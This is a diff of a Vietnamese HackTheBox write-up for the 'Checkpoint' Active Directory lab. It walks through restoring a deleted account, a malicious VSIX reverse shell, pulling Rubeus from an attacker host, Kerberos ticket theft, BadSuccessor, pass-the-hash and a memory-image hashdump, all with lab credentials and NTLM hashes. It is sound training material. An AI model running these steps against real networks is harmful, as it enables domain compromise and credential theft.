@@ -1,12 +1,25 @@
+---
+title: "HackTheBox Write-up: Checkpoint"
+date: 2026-07-16 
+categories: [Write-ups, HackTheBox]
+---
+
 # HackTheBox - Checkpoint (Season 11) Writeup
 
 ![HTB](https://img.shields.io/badge/HackTheBox-Checkpoint-green?style=for-the-badge&logo=hackthebox)
 ![Hard](https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge)
 ![Windows](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows)
 
-Dưới đây là chi tiết các bước khai thác machine Checkpoint dựa trên các câu lệnh đã thực hiện thành công, kèm theo giải thích chi tiết cho từng thao tác.
+<img width="767" height="325" alt="Screenshot 2026-07-16 231411" src="https://github.com/user-attachments/assets/7c7f25df-9ba5-4b73-9774-2d198a910ba2" />
+
+<img width="1392" height="530" alt="Screenshot 2026-07-16 231421" src="https://github.com/user-attachments/assets/43f7c2e5-3c27-4aa0-ba4a-8c941d5ba080" />
+
+Dưới đây là chi tiết các bước exploit machine Checkpoint 
 
 ---
+Tiến hành quét cổng bằng nmap
+
+<img width="1091" height="741" alt="Screenshot 2026-07-16 152714" src="https://github.com/user-attachments/assets/7fa9b4ae-024f-40b9-b0ff-cfeb9eeb3c51" />
 
 ## Giai Đoạn 1: Initial Access (Tấn Công Chuỗi Cung Ứng VSIX)
 
@@ -17,6 +30,9 @@ sudo sed -i '/checkpoint.htb/d' /etc/hosts
 echo "10.129.7.101 checkpoint.htb dc01.checkpoint.htb dc01" | sudo tee -a /etc/hosts
 sudo ntpdate -u 10.129.7.101
 ```
+
+<img width="750" height="337" alt="Screenshot 2026-07-16 152220" src="https://github.com/user-attachments/assets/6362ebfc-beb3-4630-abd6-96762a071e9a" />
+
 * **Giải thích:**
   * Lệnh `sed` xóa các dòng cũ liên quan đến `checkpoint.htb` trong file `/etc/hosts` để tránh xung đột IP cũ.
   * Lệnh `echo` thêm IP mới `10.129.7.101` trỏ về các tên miền của mục tiêu. Việc phân giải đúng tên miền (Domain Name Resolution) là bắt buộc trong môi trường Active Directory (AD).
@@ -31,6 +47,9 @@ bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.7.1
 
 bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.7.101 --dns 10.129.7.101 remove uac mark.davies -f ACCOUNTDISABLE
 ```
+
+<img width="1802" height="235" alt="Screenshot 2026-07-16 152446" src="https://github.com/user-attachments/assets/79daebb4-610d-4f47-a61a-be67d8823849" />
+
 * **Giải thích:**
   * Ta sử dụng thông tin đăng nhập của `alex.turner` (đã biết từ việc liệt kê trước đó) để tương tác với LDAP/AD qua công cụ `bloodyAD`.
   * `set restore`: Khôi phục lại đối tượng `Mark Davies` đã bị xóa (nằm trong thùng rác `Deleted Objects` của AD) dựa vào chuỗi định danh (GUID).
@@ -82,6 +101,9 @@ Mở listener chờ shell kết nối về:
 ```bash
 nc -nlvp 9001
 ```
+
+<img width="605" height="142" alt="Screenshot 2026-07-16 153044" src="https://github.com/user-attachments/assets/6461be38-0200-4c31-8492-02253f29bfbf" />
+
 * **Giải thích:** Sử dụng Netcat để lắng nghe các kết nối đến port `9001`. Khi mục tiêu chạy reverse shell, nó sẽ gọi ngược về đây và cấp cho ta quyền điều khiển.
 
 ### Step 5: Terminal 2 - Upload
@@ -92,6 +114,9 @@ Upload file extension lên thư mục chia sẻ `DevDrop`:
 smbclient //10.129.7.101/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put /tmp/evil-ext.vsix checkpoint-theme.vsix'
 ```
 * **Giải thích:** Kết nối vào giao thức chia sẻ file SMB của máy mục tiêu bằng tài khoản `mark.davies` (vừa được khôi phục ở Step 2). Đẩy (`put`) file extension độc hại vào thư mục `DevDrop`. Ngay khi file có mặt ở đây, hệ thống mục tiêu sẽ quét, tự động cài đặt và chạy payload. Bạn sẽ nhận được shell với quyền của user `ryan.brooks`.
+lúc này đã có được shell, tiến hành tìm flag user.txt
+
+<img width="1281" height="737" alt="Screenshot 2026-07-16 153130" src="https://github.com/user-attachments/assets/c74b53dd-dfd0-434a-b4f0-4b2e1b9de052" />
 
 ---
 
@@ -106,6 +131,9 @@ whoami /groups
 net user ryan.brooks /domain
 dir \\DC01\VMBackups
 ```
+
+<img width="555" height="276" alt="Screenshot 2026-07-16 153134" src="https://github.com/user-attachments/assets/5c06f9a9-0efd-4cf6-8e98-d8b4d07f0fc3" />
+
 * **Giải thích:**
   * `whoami /groups`: Xem các nhóm mà `ryan.brooks` thuộc về.
   * `net user ...`: Kiểm tra thông tin domain của tài khoản.
@@ -118,25 +146,33 @@ Sử dụng `NetExec (nxc)` với module `badsuccessor` để scan lỗ hổng:
 ```bash
 nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
 ```
+
+<img width="1442" height="226" alt="Screenshot 2026-07-16 153231" src="https://github.com/user-attachments/assets/b7f38953-4197-4e15-aca7-17d4a4e1576f" />
+
 * **Giải thích:** `badsuccessor` là một mô-đun của NetExec để dò quét lỗi cấu hình uỷ quyền trong AD.
 > **NOTE:** BadSuccessor là một kỹ thuật tấn công Privilege Escalation khai thác cấu hình dMSA (delegated Managed Service Account) trong Active Directory. Bằng cách thao túng các tài khoản dMSA, kẻ tấn công có thể giả mạo (impersonate) quyền hạn của các tài khoản khác.
 
 ### Bước 3: Upload Rubeus lên target
 
 **3a. Host Rubeus trên máy attacker:**
-Trên máy Kali, host file `rubeus.exe` qua HTTP:
+Trên máy Kali, host file `Rubeus.exe` qua HTTP:
 
 ```bash
 # Mở HTTP server (nếu chưa có)
 python3 -m http.server 8181
 ```
 
+<img width="737" height="238" alt="Screenshot 2026-07-16 154556" src="https://github.com/user-attachments/assets/2fbfb56f-16a5-450e-93e7-74858fd52333" />
+
 **3b. Download Rubeus trên target:**
 Trong shell PowerShell trên target:
 
 ```powershell
-Invoke-WebRequest -Uri 'http://10.10.14.114:8181/rubeus.exe' -OutFile C:\Windows\Temp\rubeus.exe
+Invoke-WebRequest -Uri 'http://10.10.14.114:8181/Rubeus.exe' -OutFile C:\Windows\Temp\Rubeus.exe
 ```
+
+<img width="1247" height="60" alt="Screenshot 2026-07-16 154604" src="https://github.com/user-attachments/assets/15f4beb4-5a9a-4091-bae4-72537d3cfb5d" />
+
 * **Giải thích:** `Rubeus` là một công cụ mạnh mẽ viết bằng C# dùng để tương tác và tấn công giao thức xác thực Kerberos. Bước này ta truyền nó vào thư mục tạm (`Temp`) trên máy mục tiêu.
 
 ### Bước 4: Lấy TGT bằng Rubeus (trên target)
@@ -144,9 +180,12 @@ Invoke-WebRequest -Uri 'http://10.10.14.114:8181/rubeus.exe' -OutFile C:\Windows
 Do môi trường reverse shell đôi khi làm mất output (không trả về gì cả) khi độ dài chuỗi base64 quá lớn, ta cần chuyển hướng kết quả vào một file text để đọc:
 
 ```powershell
-C:\Windows\Temp\rubeus.exe tgtdeleg /nowrap > C:\Windows\Temp\tgt.txt
+C:\Windows\Temp\Rubeus.exe tgtdeleg /nowrap > C:\Windows\Temp\tgt.txt
 type C:\Windows\Temp\tgt.txt
 ```
+
+<img width="1917" height="567" alt="Screenshot 2026-07-16 154951" src="https://github.com/user-attachments/assets/dfd2f592-96f6-4e06-93e8-c23727972c5a" />
+
 * **Giải thích:** Lệnh `tgtdeleg` lợi dụng giao thức ủy quyền (delegation) để trích xuất Ticket-Granting Ticket (TGT) của user hiện tại (`ryan.brooks`) từ bộ nhớ máy tính mà không cần đặc quyền Administrator. TGT này có thể được dùng để yêu cầu các vé truy cập (TGS) khác trong toàn mạng. Tham số `/nowrap` yêu cầu in toàn bộ chuỗi base64 trên 1 dòng để dễ copy. Việc redirect `> C:\Windows\Temp\tgt.txt` giúp tránh lỗi mất output trong reverse shell.
 
 ### Bước 5: Convert Ticket (trên máy Kali/attacker)
@@ -155,6 +194,8 @@ type C:\Windows\Temp\tgt.txt
 ```bash
 sudo ntpdate -b checkpoint.htb
 ```
+
+<img width="952" height="197" alt="Screenshot 2026-07-16 155115" src="https://github.com/user-attachments/assets/99744e9e-07ba-409b-b518-da4bc13f5492" />
 
 **5b. Lưu base64 ticket và decode:**
 ```bash
@@ -165,10 +206,14 @@ echo '<BASE64_TICKET_STRING>' > /tmp/ryan.kirbi.b64
 base64 -d /tmp/ryan.kirbi.b64 > /tmp/ryan2.kirbi
 ```
 
+<img width="1917" height="331" alt="Screenshot 2026-07-16 155225" src="https://github.com/user-attachments/assets/c28c2390-c377-4fa9-b865-b991489f09ae" />
+
 **5c. Convert .kirbi → .ccache (Impacket format):**
 ```bash
 impacket-ticketConverter /tmp/ryan2.kirbi /tmp/ryan2.ccache
 ```
+
+<img width="693" height="282" alt="Screenshot 2026-07-16 155259" src="https://github.com/user-attachments/assets/335276b2-f5b4-4078-8fef-8c86d3880424" />
 
 **5d. Set Kerberos credential cache:**
 ```bash
@@ -189,6 +234,11 @@ bloodyAD -k ccache=/tmp/ryan2.ccache \
   -d checkpoint.htb \
   get writable --right WRITE
 ```
+
+<img width="895" height="732" alt="Screenshot 2026-07-16 155433" src="https://github.com/user-attachments/assets/9584c8cd-b22a-4cd8-bbb2-1c97afde2b08" />
+
+<img width="852" height="735" alt="Screenshot 2026-07-16 155439" src="https://github.com/user-attachments/assets/5ff3ced1-f038-438f-bd9b-ff66151559e3" />
+
 * **Giải thích:** Với vé TGT của `ryan.brooks` (tham số `-k`), ta dùng `bloodyAD` để truy vấn LDAP xem tài khoản này có quyền Ghi (WRITE) lên những đối tượng nào trong hệ thống mạng. Kết quả trả về cho thấy ta có quyền sửa đổi tài khoản `svc_deploy` (`CN=svc_deploy,OU=ServiceAccounts...`).
 
 **6b. Exploit BadSuccessor để lấy hash svc_deploy:**
@@ -218,6 +268,9 @@ smbclient //checkpoint.htb/VMBackups \
   --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 \
   -t 600
 ```
+
+<img width="690" height="201" alt="Screenshot 2026-07-16 161238" src="https://github.com/user-attachments/assets/d20723d9-b4c9-433d-9e9c-332f4055b2d0" />
+
 * **Giải thích:** Kỹ thuật **Pass-the-Hash (PtH)**: Dùng hàm băm NTLM `--pw-nt-hash` thay vì password plaintext để đăng nhập. Tài khoản `svc_deploy` có quyền truy cập ổ đĩa chia sẻ `VMBackups`. Tham số `-t 600` (timeout 600 giây) để smbclient không ngắt kết nối giữa chừng khi tải các file quá nặng.
 
 Trong smbclient:
@@ -226,6 +279,11 @@ smb: \> cd "NightlyBackup_2024-11-01\memory forensics"
 smb: \> get "Windows Server 2019-Snapshot1.vmsn"
 smb: \> get "Windows Server 2019-Snapshot1.vmem"
 ```
+
+<img width="1597" height="307" alt="Screenshot 2026-07-16 161255" src="https://github.com/user-attachments/assets/d4630865-78fc-4a24-b0e7-b0ade9a25d86" />
+
+<img width="1060" height="100" alt="Screenshot 2026-07-16 161326" src="https://github.com/user-attachments/assets/510a5a7b-af23-4091-97b7-760cc2e242f8" />
+
 * **Giải thích:** Ta tải về bản sao lưu bộ nhớ máy ảo (`.vmem` - file chứa toàn bộ nội dung RAM của hệ thống tại thời điểm backup) và tệp trạng thái (`.vmsn`). File RAM này chứa rất nhiều dữ liệu nhạy cảm, bao gồm cả mật khẩu và mã băm của quản trị viên.
 
 ### Bước 8: Memory Forensics (Lấy hash Administrator)
@@ -235,6 +293,9 @@ Phân tích bộ nhớ bằng Volatility 3:
 ```bash
 vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump
 ```
+
+<img width="1917" height="362" alt="Screenshot 2026-07-16 230200" src="https://github.com/user-attachments/assets/016a3ff2-1598-4aa4-8c59-8b8fa10b7891" />
+
 * **Giải thích:** `Volatility 3` là framework chuyên dụng cho Memory Forensics. Plugin `windows.hashdump` sẽ dò quét toàn bộ mảng RAM (2GB file .vmem) để trích xuất khoá mã hoá SAM và SYSTEM, từ đó giải mã ra được NTLM Hash của tất cả các user đã đăng nhập.
 * **Kết quả:** Ta lấy được hash của `Administrator`: `f29e9c014295b9b32139b09a2790be3b`
 
@@ -269,7 +330,9 @@ Hóa ra cờ được giấu trong Desktop của user `max.palmer`. Ta có thể
 type C:\Users\max.palmer\Desktop\root.txt
 ```
 
-Hoặc nếu lỡ thoát shell, có thể dùng `NetExec (nxc)` để thực thi lệnh đọc (wmiexec):
+<img width="465" height="283" alt="Screenshot 2026-07-16 231105" src="https://github.com/user-attachments/assets/13115fa4-9225-4ef0-a7ba-0e9c71acf8b6" />
+
+có thể dùng `NetExec (nxc)` để thực thi lệnh đọc (wmiexec):
 ```bash
 nxc smb 10.129.18.33 \
   -u Administrator \
@@ -277,9 +340,6 @@ nxc smb 10.129.18.33 \
   -x 'type C:\Users\max.palmer\Desktop\root.txt'
 ```
 
-Kết quả trả về mã MD5 của cờ:
-```
-8dd1cea3f79aa935cd4e853fb134e318
-```
+<img width="1336" height="296" alt="Screenshot 2026-07-16 231115" src="https://github.com/user-attachments/assets/fdeadc78-ae31-42ff-a5cf-4e3da3f7e59a" />
 
-🎉 **Chúc mừng bạn đã hoàn thành bài Lab Checkpoint!** 🏴
+=> flag root.txt là dòng cuối cùng 
